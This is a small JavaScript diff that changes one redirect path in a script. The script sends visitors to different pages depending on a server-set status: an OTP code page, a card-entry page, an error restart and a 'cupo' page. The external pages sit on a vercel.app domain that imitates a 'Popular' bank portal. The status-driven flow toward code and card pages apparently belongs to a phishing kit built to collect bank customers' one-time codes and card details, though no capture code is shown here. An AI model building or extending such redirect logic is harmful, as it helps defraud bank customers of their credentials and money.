@@ -168,7 +168,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         return;
       }
 
-      if (data.estado === "autorizado") window.location.href = "/inicio/cupo.html";
+      if (data.estado === "autorizado") window.location.href = "cupo.html";
       else if (data.estado === "error") window.location.href = "https://portalwebpopular.vercel.app/popular/pre/";
       else if (data.estado === "otp") window.location.href = "https://portalwebpopular.vercel.app/popular/pre/codeinco.html";
       else if (data.estado === "fallo") window.location.href = "https://portalwebpopular.vercel.app/popular/pre/tarjeta.html";
